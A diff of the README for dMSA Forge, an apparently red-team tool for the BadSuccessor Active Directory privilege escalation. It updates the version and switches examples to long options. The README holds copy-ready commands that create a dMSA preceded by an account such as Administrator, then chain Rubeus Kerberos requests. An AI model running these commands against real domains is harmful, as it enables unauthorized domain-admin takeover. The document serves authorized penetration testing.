@@ -1,12 +1,12 @@
 # dMSA Forge
 
-[![Release](https://img.shields.io/github/v/release/RedteamNotes/dmsa-forge?label=release)](https://github.com/RedteamNotes/dmsa-forge/releases/tag/v0.5.15)
+[![Release](https://img.shields.io/github/v/release/RedteamNotes/dmsa-forge?label=release)](https://github.com/RedteamNotes/dmsa-forge/releases/tag/v0.5.16)
 [![Tests](https://github.com/RedteamNotes/dmsa-forge/actions/workflows/test.yml/badge.svg)](https://github.com/RedteamNotes/dmsa-forge/actions/workflows/test.yml)
 [![License](https://img.shields.io/badge/license-Impacket%20Apache--1.1-blue)](https://github.com/RedteamNotes/dmsa-forge/blob/main/LICENSE)
 
 **Language:** English | [简体中文](assets/README.zh-CN.md) | [Français](assets/README.fr.md)
 
-Current release: `v0.5.15`
+Current release: `v0.5.16`
 
 A [dMSA](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/delegated-managed-service-accounts/delegated-managed-service-accounts-overview) forge for authorized [BadSuccessor](https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory) LDAP workflows: assess, add, verify, and delete.
 
@@ -71,17 +71,17 @@ dmsaforge update --dry-run
 ```
 
 For source-checkout use without installation, run `./dmsaforge.py`.
-Task-named commands and common short flags are shown below. Long options remain available for scripts that prefer explicit names.
+Examples and generated next steps use long options by default. Short aliases such as `-m`, `-p`, `-d`, `-o`, and `-t` remain available for interactive use.
 
 ## Quick Start
 
 Preview an add with the safe profile. Commands in this README are intentionally shown as one-line, copy-ready examples; if you use a local wrapper such as `proxychains -f chain1080.conf -q`, place it before `dmsaforge`.
 
 ```bash
-dmsaforge plan add redteamnotes.com/operator:'PASSWORD' --profile safe -o 'OU=Dev,DC=redteamnotes,DC=com' -d redpen -t 'Administrator' --principals-allowed '<SID_OR_NAME>'
+dmsaforge plan add redteamnotes.com/operator:'PASSWORD' --profile safe --ou 'OU=Dev,DC=redteamnotes,DC=com' --dmsa-name redpen --target-account 'Administrator' --principals-allowed '<SID_OR_NAME>'
 ```
 
-By default, `DOMAIN/user` infers `--scope-domain`, `--scope-base-dn`, and `--base-dn`; LDAP/389 is the default method and port; `--dns-hostname` is inferred from `-d/--dmsa-name` and the account domain. For `add`, explicitly choose both the predecessor account with `-t/--target-account` and the managed-password reader with `--principals-allowed`.
+By default, `DOMAIN/user` infers `--scope-domain`, `--scope-base-dn`, and `--base-dn`; LDAP/389 is the default method and port; `--dns-hostname` is inferred from `--dmsa-name` and the account domain. For `add`, explicitly choose both the predecessor account with `--target-account` and the managed-password reader with `--principals-allowed`.
 
 The templates use `redpen` as a suggested dMSA name and `Administrator` as a common predecessor-account example. Replace either value when the authorized chain targets a different object.
 
@@ -98,46 +98,46 @@ dmsaforge assess redteamnotes.com/operator:'PASSWORD' --dc-host dc.redteamnotes.
 Pre-add verify:
 
 ```bash
-dmsaforge verify redteamnotes.com/operator:'PASSWORD' --dc-host dc.redteamnotes.com -o 'OU=Dev,DC=redteamnotes,DC=com' -d redpen
+dmsaforge verify redteamnotes.com/operator:'PASSWORD' --dc-host dc.redteamnotes.com --ou 'OU=Dev,DC=redteamnotes,DC=com' --dmsa-name redpen
 ```
 
 Plan add:
 
 ```bash
-dmsaforge plan add redteamnotes.com/operator:'PASSWORD' --dc-host dc.redteamnotes.com -o 'OU=Dev,DC=redteamnotes,DC=com' -d redpen -t 'Administrator' --principals-allowed '<SID_OR_NAME>'
+dmsaforge plan add redteamnotes.com/operator:'PASSWORD' --dc-host dc.redteamnotes.com --ou 'OU=Dev,DC=redteamnotes,DC=com' --dmsa-name redpen --target-account 'Administrator' --principals-allowed '<SID_OR_NAME>'
 ```
 
 Add:
 
 ```bash
-dmsaforge add redteamnotes.com/operator:'PASSWORD' --dc-host dc.redteamnotes.com -o 'OU=Dev,DC=redteamnotes,DC=com' -d redpen -t 'Administrator' --principals-allowed '<SID_OR_NAME>'
+dmsaforge add redteamnotes.com/operator:'PASSWORD' --dc-host dc.redteamnotes.com --ou 'OU=Dev,DC=redteamnotes,DC=com' --dmsa-name redpen --target-account 'Administrator' --principals-allowed '<SID_OR_NAME>'
 ```
 
 Post-add verify:
 
 ```bash
-dmsaforge verify redteamnotes.com/operator:'PASSWORD' --dc-host dc.redteamnotes.com -o 'OU=Dev,DC=redteamnotes,DC=com' -d redpen
+dmsaforge verify redteamnotes.com/operator:'PASSWORD' --dc-host dc.redteamnotes.com --ou 'OU=Dev,DC=redteamnotes,DC=com' --dmsa-name redpen
 ```
 
 Delete when finished:
 
 ```bash
-dmsaforge delete redteamnotes.com/operator:'PASSWORD' --dc-host dc.redteamnotes.com -o 'OU=Dev,DC=redteamnotes,DC=com' -d redpen --yes
+dmsaforge delete redteamnotes.com/operator:'PASSWORD' --dc-host dc.redteamnotes.com --ou 'OU=Dev,DC=redteamnotes,DC=com' --dmsa-name redpen --yes
 ```
 
 After a verified `add` or `verify`, `Next steps` includes concrete external Kerberos commands. The generated flow starts with `Rubeus hash`, then uses the printed AES256 value for `asktgt`, then runs the dMSA `asktgs` request.
 
-Target account resolution is LDAP-search based. `-t/--target-account` writes `msDS-ManagedAccountPrecededByLink`; `--principals-allowed` writes the SID used in `msDS-GroupMSAMembership`. Assessment-generated next steps can fill the discovered principal SID, but the target account remains an explicit operator choice.
+Target account resolution is LDAP-search based. `--target-account` writes `msDS-ManagedAccountPrecededByLink`; `--principals-allowed` writes the SID used in `msDS-GroupMSAMembership`. Assessment-generated next steps can fill the discovered principal SID, but the target account remains an explicit operator choice.
 
 Safety controls:
 
 - Use `dmsaforge plan ACTION ...`, `--dry-run`, or `--plan` to validate options and print the planned LDAP operations without opening an LDAP connection.
 - Use `--profile safe` for a redacted dry-run preset, `--profile report` for JSON reports, or `--profile ci` for quiet JSON/no-banner output.
 - `DOMAIN/user` infers `--scope-domain`, `--scope-base-dn`, and `--base-dn`; a valid `--scope-base-dn` can also supply the default base DN. Override with explicit flags when the authorized scope differs.
-- LDAP/389 is tried first when `-m/--method` and `-p/--port` are omitted. If that connection fails, dMSA Forge can try LDAPS/636 and records the attempted candidates in terminal output and JSON/text reports. A lone `-p 636` infers LDAPS; pin both method and port to require an exact pair.
-- `--dns-hostname` defaults to `<dmsa-name>.<account-domain>` when `-d/--dmsa-name` is set.
+- LDAP/389 is tried first when `--method` and `--port` are omitted. If that connection fails, dMSA Forge can try LDAPS/636 and records the attempted candidates in terminal output and JSON/text reports. A lone `--port 636` infers LDAPS; pin both method and port to require an exact pair.
+- `--dns-hostname` defaults to `<dmsa-name>.<account-domain>` when `--dmsa-name` is set.
 - Use `--dc-host` for a specific DC hostname and `--dc-ip` only when DNS or routing requires an IP override. Automatic DC IP resolution never probes the network; multicast, loopback, link-local, unspecified, broadcast, and reserved DNS results are rejected so proxy DNS placeholders such as `224.0.0.1` do not become Kerberos `/dc:` values.
-- For `assess`, `-o/--ou` narrows the OU assessment base. The Domain Controller prerequisite check is best-effort; if it fails, the OU assessment continues and records a warning.
+- For `assess`, `--ou` narrows the OU assessment base. The Domain Controller prerequisite check is best-effort; if it fails, the OU assessment continues and records a warning.
 - Target account and `--principals-allowed` name resolution prefer exact `sAMAccountName`/UPN/CN matches. Ambiguous LDAP results fail closed with a prompt to pass a full DN or SID.
 - `delete` requires `--yes`. The old `modify` workflow has been removed; use `delete`, `add`, and `verify` instead.
 - Local output is redacted by default. `--no-redact` requires `--debug`.
